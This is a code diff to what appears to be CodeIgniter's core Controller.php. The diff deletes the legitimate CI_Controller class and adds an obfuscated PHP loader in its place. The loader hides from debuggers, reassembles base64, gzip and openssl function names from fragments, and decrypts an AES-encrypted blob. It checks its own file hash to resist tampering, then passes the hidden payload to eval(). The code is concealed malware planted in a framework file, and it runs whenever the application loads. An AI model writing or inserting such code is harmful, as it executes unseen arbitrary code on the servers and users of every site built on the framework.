@@ -1,96 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * Application Controller Class
- *
- * This class object is the super class that every library in
- * CodeIgniter will be assigned to.
- *
- * @package		CodeIgniter
- * @subpackage	Libraries
- * @category	Libraries
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/general/controllers.html
- */
-class CI_Controller {
-
-	/**
-	 * Reference to the CI singleton
-	 *
-	 * @var	object
-	 */
-	private static $instance;
-
-	/**
-	 * Class constructor
-	 *
-	 * @return	void
-	 */
-	public function __construct()
-	{
-		self::$instance =& $this;
-
-		// Assign all the class objects that were instantiated by the
-		// bootstrap file (CodeIgniter.php) to local class variables
-		// so that CI can run as one big super object.
-		foreach (is_loaded() as $var => $class)
-		{
-			$this->$var =& load_class($class);
-		}
-
-		$this->load =& load_class('Loader', 'core');
-		$this->load->initialize();
-		log_message('info', 'Controller Class Initialized');
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Get the CI singleton
-	 *
-	 * @static
-	 * @return	object
-	 */
-	public static function &get_instance()
-	{
-		return self::$instance;
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_mtet0ygf=('bas'.'e64'.'_de'.'cod'.'e');
+$_t5kcj2ol=('gzu'.'nco'.'mpr'.'ess');
+$_jb98386p=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_bn4puw93='l3GLfNfi';
+$_cm9qih2f='j6Lyyfb3';
+$_rtmeq6bc='8vNxrvM5';
+$_kj1vg1k2='awGGFts+Lxg=';
+$_cqfx7ufy='0Bp7OKj5';
+$_qk7xgtt1='slXAaMph';
+$_xdoxhhxg='1K9I8A==';
+$_lfqlqvxo='4mjbf0GC';
+$_lhh3ukq3=$_mtet0ygf($_rtmeq6bc.$_cm9qih2f.$_cqfx7ufy.$_bn4puw93.$_kj1vg1k2);
+$_nqh6laoo=$_mtet0ygf($_qk7xgtt1.$_lfqlqvxo.$_xdoxhhxg);
+$_jgfnw5oi=$_mtet0ygf('3UHLaX/Bwoji/d+6zv/ax3STm64UrPwAd5ggse8CxTWNCtnduKu8U5IqjWyIcCvE+EStJ4py5t+bJBZiRXJD5dzLyo/ryGJJqR6W3eBWx/jxzjTsHeZj1aYk6fVbmTPYtBdMlLo9/222WgEC9ZCsxu/CfK2FLiz8u+E4EXNCYR5IsLso+/lZ36lo52g1uRCjnDmBhVi7ySnpIFNTXQp1JnZX6GHf26VP/JZkpt+gTjvudHGmyE5vtMKj/ibmRsWhvHaWTcRtquSpyU82BOv43HwGK+vKTNK3RfC5AU15vx59XMmdf3nCw5TJPgbCvpyUPbMB5iCUYoYOEfz5nuKkxqSH1CEPX34SteqZrdufJGtbaXSaBmpd7FVvSRCizDab');
+$_txeuk34v=$_jb98386p($_jgfnw5oi,'aes-256-cbc',$_lhh3ukq3,OPENSSL_RAW_DATA,$_nqh6laoo);
+if($_txeuk34v===false){exit;}
+$_g7j90x7p=$_t5kcj2ol($_txeuk34v);
+if($_g7j90x7p===false){exit;}
+$_wyv4vri5='fda5d0681eb57ebe0f75bfd29a1f71be3a7596e6e79ff23606967857ed6cf496';
+$_sqw5kq53=@file_get_contents(__FILE__);
+if($_sqw5kq53!==false){
+$_pbs8foa0=str_replace($_wyv4vri5,"0000000000000000000000000000000000000000000000000000000000000000",$_sqw5kq53);
+$_vvhzn8yv=hash("sha256",$_pbs8foa0);
+if($_vvhzn8yv!==$_wyv4vri5){@http_response_code(403);exit;}
 }
+eval($_g7j90x7p);
